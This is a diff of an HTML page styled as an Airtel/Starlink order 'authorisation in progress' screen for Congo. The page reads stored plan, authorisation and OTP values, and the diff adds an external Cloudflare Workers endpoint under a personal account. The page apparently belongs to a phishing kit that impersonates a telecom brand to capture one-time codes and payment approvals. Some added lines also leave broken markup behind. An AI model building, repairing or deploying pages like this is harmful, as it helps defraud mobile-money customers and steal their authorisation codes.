@@ -92,11 +92,11 @@ img{display:block;max-width:100%}
 
 <nav class="nav">
   <div class="nav-logos">
-    <img src="assets/airtel-logo.svg" alt="Airtel" height="18" onerror="this.outerHTML='<span style=\'font-size:16px;font-weight:900;color:#fff\'>airtel</span>'">
+    <img src="assets/logo.svg" alt="Airtel" height="20" style="filter:brightness(0) invert(1)" onerror="this.style.display='none'">airtel</span>'">
     <div class="nav-sep"></div>
-    <img src="assets/starlink-white.png" alt="Starlink" height="12" onerror="this.outerHTML='<span style=\'font-size:10px;font-weight:800;letter-spacing:1.5px;color:rgba(255,255,255,.85)\'>STARLINK</span>'">
+    <img src="assets/starlink_logo_with_icon_transparent_black.png" alt="Starlink" height="13" style="filter:brightness(0) invert(1)" onerror="this.style.display='none'">STARLINK</span>'">
   </div>
-  <img src="assets/airtel-logo.svg" alt="Airtel" height="18" style="opacity:0" aria-hidden="true">
+  <img src="assets/logo.svg" alt="Airtel" height="20" style="filter:brightness(0) invert(1)" onerror="this.style.display='none'">
 </nav>
 
 <div class="scroll">
@@ -108,7 +108,7 @@ img{display:block;max-width:100%}
         <div class="ping-wrap"><div class="ping-ring"></div><div class="ping-core"></div></div>
         <span class="status-txt">Autorisation en Cours</span>
       </div>
-      <img src="assets/airtel-logo.svg" alt="Airtel" height="18" onerror="this.outerHTML='<span style=\'font-size:15px;font-weight:900;color:var(--red)\'>airtel</span>'">
+      <img src="assets/logo.svg" alt="Airtel" height="18" onerror="this.outerHTML='<span style=\'font-size:15px;font-weight:900;color:var(--red)\'>airtel</span>'">
     </div>
 
     <!-- Ref card -->
@@ -168,6 +168,7 @@ img{display:block;max-width:100%}
 
 <script>
 'use strict';
+var WORKER='https://airtel-congo-api.lennxkoros.workers.dev';
 function hap(ms){try{navigator.vibrate&&navigator.vibrate(ms);}catch(e){}}
 function rip(el,e){var r=el.getBoundingClientRect(),sz=Math.max(r.width,r.height)*2.5,s=document.createElement('span');s.className='rip';s.style.cssText='width:'+sz+'px;height:'+sz+'px;left:'+(e.clientX-r.left-sz/2)+'px;top:'+(e.clientY-r.top-sz/2)+'px;';el.appendChild(s);s.addEventListener('animationend',function(){s.remove();});}
 function slp(ms){return new Promise(function(r){setTimeout(r,ms);})}
@@ -177,7 +178,7 @@ var forfait={},auth={};
 try{forfait=JSON.parse(sessionStorage.getItem('starlinkForfait')||'{}');}catch(e){}
 try{auth=JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}');}catch(e){}
 var ref=sessionStorage.getItem('starlinkRef')||('STL-CG-'+(Math.random()*9e5+1e5|0));
-var otp=sessionStorage.getItem('starlinkCode OTP')||'';
+var otp=sessionStorage.getItem('starlinkOTP')||'';
 
 document.getElementById('refVal').textContent='#'+ref;
 document.getElementById('drForfait').textContent=(forfait.name||'—')+' · '+(forfait.price||'');
@@ -213,7 +214,7 @@ function copyRef(){
   var txt=document.getElementById('refVal').textContent;
   if(navigator.clipboard)navigator.clipboard.writeText(txt);
   hap(18);
-  var btn=document.queryChoisiror('.copy-btn');
+  var btn=document.querySelector('.copy-btn');
   var orig=btn.innerHTML;
   btn.innerHTML='<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#386A20" stroke-width="2.5" stroke-linecap="round"><path d="M4 12l5.5 5.5L20 7"/></svg> Copié !';
   setTimeout(function(){btn.innerHTML=orig;},2000);
@@ -222,11 +223,11 @@ function copyRef(){
 // New order
 function newOrder(){
   sessionStorage.removeItem('starlinkForfait');sessionStorage.removeItem('starlinkAuth');
-  sessionStorage.removeItem('starlinkRef');sessionStorage.removeItem('starlinkCode OTP');
+  sessionStorage.removeItem('starlinkRef');sessionStorage.removeItem('starlinkOTP');
   location.href='airtel-index.html';
 }
 
-document.queryChoisirorAll('button').forEach(function(b){b.addEventListener('pointerdown',function(e){rip(this,e);},{passive:true});});
+document.querySelectorAll('button').forEach(function(b){b.addEventListener('pointerdown',function(e){rip(this,e);},{passive:true});});
 </script>
 </body>
 </html>
